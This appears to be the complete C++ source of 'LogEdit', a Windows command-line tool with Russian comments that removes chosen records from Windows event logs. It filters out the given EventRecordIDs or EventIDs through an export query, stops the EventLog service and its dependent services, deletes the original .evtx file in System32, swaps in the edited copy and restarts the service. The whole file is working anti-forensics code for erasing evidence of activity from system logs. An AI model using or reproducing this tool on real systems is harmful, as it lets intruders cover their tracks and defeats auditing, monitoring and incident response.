#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <winevt.h>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <Strsafe.h>
#include <tlhelp32.h> 
#include <direct.h>
#include <winsvc.h>
#define UNICODE
#pragma comment(lib,"wevtapi.lib")
#pragma comment(lib,"Advapi32.lib")

// Путь к изначальному файлу
static std::string destination;
// Путь к новому файлу
static std::string origin;
//Название процесса
static LPCSTR szSvcName = "EventLog";
// Переменные для остановки EventLog
SC_HANDLE schSCManager;
SC_HANDLE schService;
HANDLE hConsole;
SERVICE_STATUS_PROCESS ssp;

// Преобразования типов
LPCTSTR StringToLPCTSTR(std::string input) {
	std::vector<wchar_t> buffer(input.size() + 1);
	mbstowcs(buffer.data(), input.c_str(), input.size());
	LPCTSTR output = reinterpret_cast<LPCTSTR>(buffer.data());
	return output;
}
wchar_t* CharToWchar_t(const char* in) {
	size_t size = strlen(in) + 1;
	wchar_t* out = new wchar_t[size];
	size_t convertedChars = 0;
	mbstowcs_s(&convertedChars, out, size, in, _TRUNCATE);
	return out;
}

// Логотип
void PrintLogo() {
	std::cout << "==========================================\n";
	SetConsoleTextAttribute(hConsole, 9);
	std::cout << "    __                        __       __\n   /  /   ____  ____  ___ ___/  /_ __/  /_\n  /  /  / __  / __  / _  / __  /  /_   __/\n /  /__/ /_/ / /_/ / /__/ /_/ /  / /  /_\n/_____/\\____/\\___ /\\___/\\____/__/  \\___/\n             /___/\n";
	SetConsoleTextAttribute(hConsole, 7);
	std::cout << "==========================================\n";
}

// Проверка строки на наличие символов
bool IsNumeric(std::string in) {
	for (int i = 0; i < in.size(); i++) {
		if (!isdigit(in[i]))
			return false;
	}
	return true;
}
// Разделение строки на отдельные идентификаторы
std::vector<std::string> SeparatedIDs(std::string input) {
	std::vector<std::string> output;
	std::string temp = "";
	input += " ";
	for (auto s : input) {
		if (s != ' ') {
			temp += s;
		}
		else {
			if (IsNumeric(temp)) {
				output.push_back(temp);
			}

			temp = "";
		}

	}
	return output;
}

// Удаление записи по ID записи
BOOL DeleteByEventRecordId()
{
	// Получение идентификаторов для удаления
	std::string ID;
	SetConsoleTextAttribute(hConsole, 10);
	std::cout << "[+] ";
	SetConsoleTextAttribute(hConsole, 7);
	std::cout << "Enter Event Record IDs\n";
	std::cin.ignore();
	std::getline(std::cin, ID);

	// Сбор запроса "по кускам"
	std::string QueryInside = "";
	for (int i = 0; i < SeparatedIDs(ID).size(); i++) {
		if (i != SeparatedIDs(ID).size() - 1) QueryInside += SeparatedIDs(ID)[i] + " and EventRecordID!=";
		else QueryInside += SeparatedIDs(ID)[i];
	}
	std::string Query = "Event/System[EventRecordID!=" + QueryInside + "]";

	// Копирование файла с учетом запроса
	if (!EvtExportLog(NULL, CharToWchar_t(destination.c_str()), CharToWchar_t(Query.c_str()), CharToWchar_t(origin.c_str()), EvtExportLogFilePath)) {
		SetConsoleTextAttribute(hConsole, 12);
		std::cout << "[!] ";
		SetConsoleTextAttribute(hConsole, 7);
		std::cout << "EvtExportLog error " <<  GetLastError() << "\n";
		return FALSE;
	}

	return TRUE;
}
// Удаление записей по ID события
BOOL DeleteByEventId()
{
	std::string ID;
	SetConsoleTextAttribute(hConsole, 10);
	std::cout << "[+] ";
	SetConsoleTextAttribute(hConsole, 7);
	std::cout << "Enter Event IDs\n";
	std::cin.ignore();
	std::getline(std::cin, ID);

	// Сбор запроса "по кускам"
	std::string QueryInside = "";
	for (int i = 0; i < SeparatedIDs(ID).size(); i++) {
		if (i != SeparatedIDs(ID).size() - 1) QueryInside += SeparatedIDs(ID)[i] + " and EventID!=";
		else QueryInside += SeparatedIDs(ID)[i];
	}
	std::string Query = "Event/System[EventID!=" + QueryInside + "]";

	// Копирование файла с учетом запроса
	if (!EvtExportLog(NULL, CharToWchar_t(destination.c_str()), CharToWchar_t(Query.c_str()), CharToWchar_t(origin.c_str()), EvtExportLogFilePath)) {
		SetConsoleTextAttribute(hConsole, 12);
		std::cout << "[!] ";
		SetConsoleTextAttribute(hConsole, 7);
		std::cout << "EvtExportLog error " << GetLastError() << "\n";
		return FALSE;
	}
	return TRUE;
}

// Установка адресов файлов
void SetAdresses(std::string name) {
	// Адрес изначального файла
	destination = "C:\\Windows\\System32\\winevt\\Logs\\" + name;

	// Адрес нового файла
	char buffer[FILENAME_MAX];
	_getcwd(buffer, MAX_PATH);
	name = "\\" + name;
	origin = buffer + name;
}
// Замена изначального файла на измененный
void SwapFiles()
{
	SetConsoleTextAttribute(hConsole, 10);
	std::cout << "[+] ";
	SetConsoleTextAttribute(hConsole, 7);
	std::cout << "Deleting original file";
	// Удаление
	if (DeleteFileW(CharToWchar_t(destination.c_str()))) {
		SetConsoleTextAttribute(hConsole, 10);
		std::cout << " -> Success\n[+] "; 
		SetConsoleTextAttribute(hConsole, 7);
		std::cout << "Replacing original with new file";
		// Перемещение
		if (MoveFile((LPCTSTR)CharToWchar_t(origin.c_str()), (LPCTSTR)CharToWchar_t(destination.c_str())) == 0) {
			SetConsoleTextAttribute(hConsole, 12);
			std::cout << "[!] ";
			SetConsoleTextAttribute(hConsole, 7);
			std::cout << "\nMoving failed\t" << GetLastError() << "\n";
		}
		else {
			SetConsoleTextAttribute(hConsole, 10);
			std::cout << " -> Success\n";
			SetConsoleTextAttribute(hConsole, 7);
		}
	}
	else {
		std::cout << "\n[!] Deleting failed\t" << GetLastError() << "\n";
	}
}

// Отключение службы EventLog
BOOL __stdcall StopDependentServices()
{
	DWORD i;
	DWORD dwBytesNeeded;
	DWORD dwCount;

	LPENUM_SERVICE_STATUS   lpDependencies = NULL;
	ENUM_SERVICE_STATUS     ess;
	SC_HANDLE               hDepService;
	SERVICE_STATUS_PROCESS  ssp;


	DWORD dwStartTime = GetTickCount();
	DWORD dwTimeout = 30000; // 30-second time-out

	// Pass a zero-length buffer to get the required buffer size.
	if (EnumDependentServices(schService, SERVICE_ACTIVE,
		lpDependencies, 0, &dwBytesNeeded, &dwCount))
	{
		// If the Enum call succeeds, then there are no dependent
		// services, so do nothing.
		return TRUE;
	}
	else
	{
		if (GetLastError() != ERROR_MORE_DATA)
			return FALSE; // Unexpected error

		// Allocate a buffer for the dependencies.
		lpDependencies = (LPENUM_SERVICE_STATUS)HeapAlloc(
			GetProcessHeap(), HEAP_ZERO_MEMORY, dwBytesNeeded);

		if (!lpDependencies)
			return FALSE;

		__try {
			// Enumerate the dependencies.
			if (!EnumDependentServices(schService, SERVICE_ACTIVE,
				lpDependencies, dwBytesNeeded, &dwBytesNeeded,
				&dwCount))
				return FALSE;

			for (i = 0; i < dwCount; i++)
			{
				ess = *(lpDependencies + i);
				// Open the service.
				hDepService = OpenService(schSCManager,
					ess.lpServiceName,
					SERVICE_STOP | SERVICE_QUERY_STATUS);

				if (!hDepService)
					return FALSE;

				__try {
					// Send a stop code.
					if (!ControlService(hDepService,
						SERVICE_CONTROL_STOP,
						(LPSERVICE_STATUS)&ssp))
						return FALSE;

					// Wait for the service to stop.
					while (ssp.dwCurrentState != SERVICE_STOPPED)
					{
						Sleep(ssp.dwWaitHint);
						if (!QueryServiceStatusEx(
							hDepService,
							SC_STATUS_PROCESS_INFO,
							(LPBYTE)&ssp,
							sizeof(SERVICE_STATUS_PROCESS),
							&dwBytesNeeded))
							return FALSE;

						if (ssp.dwCurrentState == SERVICE_STOPPED)
							break;

						if (GetTickCount() - dwStartTime > dwTimeout)
							return FALSE;
					}
				}
				__finally
				{
					// Always release the service handle.
					CloseServiceHandle(hDepService);
				}
			}
		}
		__finally
		{
			// Always free the enumeration buffer.
			HeapFree(GetProcessHeap(), 0, lpDependencies);
		}
	}
	return TRUE;
}
VOID __stdcall DoStopSvc()
{

	DWORD dwStartTime = GetTickCount();
	DWORD dwBytesNeeded;
	DWORD dwTimeout = 30000; // 30-second time-out
	DWORD dwWaitTime;
	//SERVICE_STATUS_PROCESS ssp;

	// Get a handle to the SCM database. 

	schSCManager = OpenSCManager(
		NULL,                    // local computer
		NULL,                    // ServicesActive database 
		SC_MANAGER_ALL_ACCESS);  // full access rights 

	if (NULL == schSCManager)
	{
		SetConsoleTextAttribute(hConsole, 12);
		std::cout << "[!] ";
		SetConsoleTextAttribute(hConsole, 7);
		printf("OpenSCManager failed (%d)\n", GetLastError());
		return;
	}

	// Get a handle to the service.

	schService = OpenServiceA(
		schSCManager,         // SCM database 
		szSvcName,            // name of service 
		SERVICE_STOP |
		SERVICE_QUERY_STATUS |
		SERVICE_ENUMERATE_DEPENDENTS);

	if (schService == NULL)
	{
		SetConsoleTextAttribute(hConsole, 12);
		std::cout << "[!] ";
		SetConsoleTextAttribute(hConsole, 7);
		printf("OpenService failed (%d)\n", GetLastError());
		CloseServiceHandle(schSCManager);
		return;
	}

	// Make sure the service is not already stopped.

	if (!QueryServiceStatusEx(
		schService,
		SC_STATUS_PROCESS_INFO,
		(LPBYTE)&ssp,
		sizeof(SERVICE_STATUS_PROCESS),
		&dwBytesNeeded))
	{
		SetConsoleTextAttribute(hConsole, 12);
		std::cout << "[!] ";
		SetConsoleTextAttribute(hConsole, 7);
		printf("QueryServiceStatusEx failed (%d)\n", GetLastError());
		goto stop_cleanup;
	}

	if (ssp.dwCurrentState == SERVICE_STOPPED)
	{
		SetConsoleTextAttribute(hConsole, 12);
		std::cout << "[!] ";
		SetConsoleTextAttribute(hConsole, 7);
		printf("Service is already stopped.\n");
		goto stop_cleanup;
	}

	// If a stop is pending, wait for it.

	while (ssp.dwCurrentState == SERVICE_STOP_PENDING)
	{
		SetConsoleTextAttribute(hConsole, 10);
		std::cout << "[+] ";
		SetConsoleTextAttribute(hConsole, 7);
		printf("Service stop pending...\n");

		// Do not wait longer than the wait hint. A good interval is 
		// one-tenth of the wait hint but not less than 1 second  
		// and not more than 10 seconds. 

		dwWaitTime = ssp.dwWaitHint / 10;

		if (dwWaitTime < 1000)
			dwWaitTime = 1000;
		else if (dwWaitTime > 10000)
			dwWaitTime = 10000;

		Sleep(dwWaitTime);

		if (!QueryServiceStatusEx(
			schService,
			SC_STATUS_PROCESS_INFO,
			(LPBYTE)&ssp,
			sizeof(SERVICE_STATUS_PROCESS),
			&dwBytesNeeded))
		{
			SetConsoleTextAttribute(hConsole, 12);
			std::cout << "[!] ";
			SetConsoleTextAttribute(hConsole, 7);
			printf("QueryServiceStatusEx failed (%d)\n", GetLastError());
			goto stop_cleanup;
		}

		if (ssp.dwCurrentState == SERVICE_STOPPED)
		{
			SetConsoleTextAttribute(hConsole, 10);
			std::cout << "[+] ";
			SetConsoleTextAttribute(hConsole, 7);
			printf("Service stopped successfully.\n");
			goto stop_cleanup;
		}

		if (GetTickCount() - dwStartTime > dwTimeout)
		{
			SetConsoleTextAttribute(hConsole, 12);
			std::cout << "[!] ";
			SetConsoleTextAttribute(hConsole, 7);
			printf("Service stop timed out.\n");
			goto stop_cleanup;
		}
	}

	// If the service is running, dependencies must be stopped first.

	StopDependentServices();

	// Send a stop code to the service.

	if (!ControlService(
		schService,
		SERVICE_CONTROL_STOP,
		(LPSERVICE_STATUS)&ssp))
	{
		SetConsoleTextAttribute(hConsole, 12);
		std::cout << "[!] ";
		SetConsoleTextAttribute(hConsole, 7);
		printf("ControlService failed (%d)\n", GetLastError());
		goto stop_cleanup;
	}

	// Wait for the service to stop.

	while (ssp.dwCurrentState != SERVICE_STOPPED)
	{
		Sleep(ssp.dwWaitHint);
		if (!QueryServiceStatusEx(
			schService,
			SC_STATUS_PROCESS_INFO,
			(LPBYTE)&ssp,
			sizeof(SERVICE_STATUS_PROCESS),
			&dwBytesNeeded))
		{
			SetConsoleTextAttribute(hConsole, 12);
			std::cout << "[!] ";
			SetConsoleTextAttribute(hConsole, 7);
			printf("QueryServiceStatusEx failed (%d)\n", GetLastError());
			goto stop_cleanup;
		}

		if (ssp.dwCurrentState == SERVICE_STOPPED)
			break;

		if (GetTickCount() - dwStartTime > dwTimeout)
		{
			SetConsoleTextAttribute(hConsole, 12);
			std::cout << "[!] ";
			SetConsoleTextAttribute(hConsole, 7);
			printf("Wait timed out\n");
			goto stop_cleanup;
		}
	}
	SetConsoleTextAttribute(hConsole, 10);
	std::cout << "[+] ";
	SetConsoleTextAttribute(hConsole, 7);
	printf("Service stopped successfully\n");

stop_cleanup:
	CloseServiceHandle(schService);
	CloseServiceHandle(schSCManager);
}
// Включение службы EventLog
VOID __stdcall DoStartSvc()
{
	SERVICE_STATUS_PROCESS ssStatus;
	DWORD dwOldCheckPoint;
	DWORD dwStartTickCount;
	DWORD dwWaitTime;
	DWORD dwBytesNeeded;

	// Get a handle to the SCM database. 

	schSCManager = OpenSCManager(
		NULL,                    // local computer
		NULL,                    // servicesActive database 
		SC_MANAGER_ALL_ACCESS);  // full access rights 

	if (NULL == schSCManager)
	{
		SetConsoleTextAttribute(hConsole, 12);
		std::cout << "[!] ";
		SetConsoleTextAttribute(hConsole, 7);
		printf("OpenSCManager failed (%d)\n", GetLastError());
		return;
	}

	// Get a handle to the service.

	schService = OpenServiceA(
		schSCManager,         // SCM database 
		szSvcName,            // name of service 
		SERVICE_ALL_ACCESS);  // full access 

	if (schService == NULL)
	{
		SetConsoleTextAttribute(hConsole, 12);
		std::cout << "[!] ";
		SetConsoleTextAttribute(hConsole, 7);
		printf("OpenService failed (%d)\n", GetLastError());
		CloseServiceHandle(schSCManager);
		return;
	}

	// Check the status in case the service is not stopped. 

	if (!QueryServiceStatusEx(
		schService,                     // handle to service 
		SC_STATUS_PROCESS_INFO,         // information level
		(LPBYTE)&ssStatus,             // address of structure
		sizeof(SERVICE_STATUS_PROCESS), // size of structure
		&dwBytesNeeded))              // size needed if buffer is too small
	{
		SetConsoleTextAttribute(hConsole, 12);
		std::cout << "[!] ";
		SetConsoleTextAttribute(hConsole, 7);
		printf("QueryServiceStatusEx failed (%d)\n", GetLastError());
		CloseServiceHandle(schService);
		CloseServiceHandle(schSCManager);
		return;
	}

	// Check if the service is already running. It would be possible 
	// to stop the service here, but for simplicity this example just returns. 

	if (ssStatus.dwCurrentState != SERVICE_STOPPED && ssStatus.dwCurrentState != SERVICE_STOP_PENDING)
	{
		SetConsoleTextAttribute(hConsole, 12);
		std::cout << "[!] ";
		SetConsoleTextAttribute(hConsole, 7);
		printf("Cannot start the service because it is already running\n");
		CloseServiceHandle(schService);
		CloseServiceHandle(schSCManager);
		return;
	}

	// Save the tick count and initial checkpoint.

	dwStartTickCount = GetTickCount();
	dwOldCheckPoint = ssStatus.dwCheckPoint;

	// Wait for the service to stop before attempting to start it.

	while (ssStatus.dwCurrentState == SERVICE_STOP_PENDING)
	{
		// Do not wait longer than the wait hint. A good interval is 
		// one-tenth of the wait hint but not less than 1 second  
		// and not more than 10 seconds. 

		dwWaitTime = ssStatus.dwWaitHint / 10;

		if (dwWaitTime < 1000)
			dwWaitTime = 1000;
		else if (dwWaitTime > 10000)
			dwWaitTime = 10000;

		Sleep(dwWaitTime);

		// Check the status until the service is no longer stop pending. 

		if (!QueryServiceStatusEx(
			schService,                     // handle to service 
			SC_STATUS_PROCESS_INFO,         // information level
			(LPBYTE)&ssStatus,             // address of structure
			sizeof(SERVICE_STATUS_PROCESS), // size of structure
			&dwBytesNeeded))              // size needed if buffer is too small
		{
			SetConsoleTextAttribute(hConsole, 12);
			std::cout << "[!] ";
			SetConsoleTextAttribute(hConsole, 7);
			printf("QueryServiceStatusEx failed (%d)\n", GetLastError());
			CloseServiceHandle(schService);
			CloseServiceHandle(schSCManager);
			return;
		}

		if (ssStatus.dwCheckPoint > dwOldCheckPoint)
		{
			// Continue to wait and check.

			dwStartTickCount = GetTickCount();
			dwOldCheckPoint = ssStatus.dwCheckPoint;
		}
		else
		{
			if (GetTickCount() - dwStartTickCount > ssStatus.dwWaitHint)
			{
				SetConsoleTextAttribute(hConsole, 10);
				std::cout << "[+] ";
				SetConsoleTextAttribute(hConsole, 7);
				printf("Timeout waiting for service to stop\n");
				CloseServiceHandle(schService);
				CloseServiceHandle(schSCManager);
				return;
			}
		}
	}

	// Attempt to start the service.

	if (!StartService(
		schService,  // handle to service 
		0,           // number of arguments 
		NULL))      // no arguments 
	{
		SetConsoleTextAttribute(hConsole, 12);
		std::cout << "[!] ";
		SetConsoleTextAttribute(hConsole, 7);
		printf("StartService failed (%d)\n", GetLastError());
		CloseServiceHandle(schService);
		CloseServiceHandle(schSCManager);
		return;
	}
	else { 
		SetConsoleTextAttribute(hConsole, 10);
		std::cout << "[+] ";
		SetConsoleTextAttribute(hConsole, 7);
		printf("Service start pending...\n"); 
	}

	// Check the status until the service is no longer start pending. 

	if (!QueryServiceStatusEx(
		schService,                     // handle to service 
		SC_STATUS_PROCESS_INFO,         // info level
		(LPBYTE)&ssStatus,             // address of structure
		sizeof(SERVICE_STATUS_PROCESS), // size of structure
		&dwBytesNeeded))              // if buffer too small
	{
		SetConsoleTextAttribute(hConsole, 12);
		std::cout << "[!] ";
		SetConsoleTextAttribute(hConsole, 7);
		printf("QueryServiceStatusEx failed (%d)\n", GetLastError());
		CloseServiceHandle(schService);
		CloseServiceHandle(schSCManager);
		return;
	}

	// Save the tick count and initial checkpoint.

	dwStartTickCount = GetTickCount();
	dwOldCheckPoint = ssStatus.dwCheckPoint;

	while (ssStatus.dwCurrentState == SERVICE_START_PENDING)
	{
		// Do not wait longer than the wait hint. A good interval is 
		// one-tenth the wait hint, but no less than 1 second and no 
		// more than 10 seconds. 

		dwWaitTime = ssStatus.dwWaitHint / 10;

		if (dwWaitTime < 1000)
			dwWaitTime = 1000;
		else if (dwWaitTime > 10000)
			dwWaitTime = 10000;

		Sleep(dwWaitTime);

		// Check the status again. 

		if (!QueryServiceStatusEx(
			schService,             // handle to service 
			SC_STATUS_PROCESS_INFO, // info level
			(LPBYTE)&ssStatus,             // address of structure
			sizeof(SERVICE_STATUS_PROCESS), // size of structure
			&dwBytesNeeded))              // if buffer too small
		{
			SetConsoleTextAttribute(hConsole, 12);
			std::cout << "[!] ";
			SetConsoleTextAttribute(hConsole, 7);
			printf("QueryServiceStatusEx failed (%d)\n", GetLastError());
			break;
		}

		if (ssStatus.dwCheckPoint > dwOldCheckPoint)
		{
			// Continue to wait and check.

			dwStartTickCount = GetTickCount();
			dwOldCheckPoint = ssStatus.dwCheckPoint;
		}
		else
		{
			if (GetTickCount() - dwStartTickCount > ssStatus.dwWaitHint)
			{
				// No progress made within the wait hint.
				break;
			}
		}
	}

	// Determine whether the service is running.

	if (ssStatus.dwCurrentState == SERVICE_RUNNING)
	{
		SetConsoleTextAttribute(hConsole, 10);
		std::cout << "[+] ";
		SetConsoleTextAttribute(hConsole, 7);
		printf("Service started successfully.\n");
	}
	else
	{
		SetConsoleTextAttribute(hConsole, 12);
		std::cout << "[!] ";
		SetConsoleTextAttribute(hConsole, 7);
		printf("Service not started. \n");
		printf("  Current State: %d\n", ssStatus.dwCurrentState);
		printf("  Exit Code: %d\n", ssStatus.dwWin32ExitCode);
		printf("  Check Point: %d\n", ssStatus.dwCheckPoint);
		printf("  Wait Hint: %d\n", ssStatus.dwWaitHint);
	}

	CloseServiceHandle(schService);
	CloseServiceHandle(schSCManager);
}


int main(int argc, char* argv[])
{
	hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
	setlocale(LC_ALL, "RUS");
	SetAdresses(argv[1]);
	bool flag = true;
	std::string mode;
	PrintLogo();
	// Проверка на правильность ввода
	if (argc != 2)
	{
		SetConsoleTextAttribute(hConsole, 12);
		std::cout << "[!] ";
		SetConsoleTextAttribute(hConsole, 7);
		std::cout << "Error: wrong number of parameters\n";
		SetConsoleTextAttribute(hConsole, 12);
		std::cout << "[!] ";
		SetConsoleTextAttribute(hConsole, 7);
		std::cout << "Usage: LogEdit <eventlog file path>\n";
		SetConsoleTextAttribute(hConsole, 10);
		std::cout << "[+] ";
		SetConsoleTextAttribute(hConsole, 7);
		std::cout << "Example: LogEdit test_log.evtx\n";
		return 0;
	}
	// Проверка параметра режима работы
	do {
		SetConsoleTextAttribute(hConsole, 10);
		std::cout << "[+]";
		SetConsoleTextAttribute(hConsole, 7);
		std::cout << " Choose deleting method:\n1) By EventRecordId\n2) By EventId\n";
		std::cin >> mode;

		if (mode[0] > '0' && mode[0] < '3' && mode.length() == 1) {
			flag = false;

		}
		else { 
			SetConsoleTextAttribute(hConsole, 12);
			std::cout << "[!] ";
			SetConsoleTextAttribute(hConsole, 7);
			std::cout << "wrong value, try again\n"; 
		}
	} while (flag);
	// Основная логика
	switch (mode[0]) {
	case('1'): {

		if (DeleteByEventRecordId())
		{
			SetConsoleTextAttribute(hConsole, 10);
			std::cout << "[+] ";
			SetConsoleTextAttribute(hConsole, 7);
			std::cout << "Delete success\n";
		}
		else
		{
			SetConsoleTextAttribute(hConsole, 12);
			std::cout << "[!] ";
			SetConsoleTextAttribute(hConsole, 7);
			std::cout << "Delete error: " << GetLastError() << "\n";
			return 0;
		}
		break;
	}
	case('2'): {
		if (DeleteByEventId())
		{
			SetConsoleTextAttribute(hConsole, 10);
			std::cout << "[+] ";
			SetConsoleTextAttribute(hConsole, 7);
			std::cout << "Delete success\n";
		}
		else
		{
			SetConsoleTextAttribute(hConsole, 12);
			std::cout << "[!] ";
			SetConsoleTextAttribute(hConsole, 7);
			std::cout << "Delete error: " << GetLastError() << "\n";
			return 0;
		}
		break;
	}
	}
	DoStopSvc();
	SwapFiles();
	DoStartSvc();
	return 0;
}